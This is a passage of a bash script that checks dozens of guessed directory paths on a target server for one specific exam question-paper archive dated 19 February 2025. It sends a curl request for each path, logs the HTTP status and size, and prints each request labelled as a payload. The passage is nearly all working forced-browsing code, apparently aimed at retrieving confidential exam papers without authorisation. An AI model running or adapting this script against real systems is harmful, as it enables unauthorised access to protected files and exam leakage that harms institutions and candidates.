${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
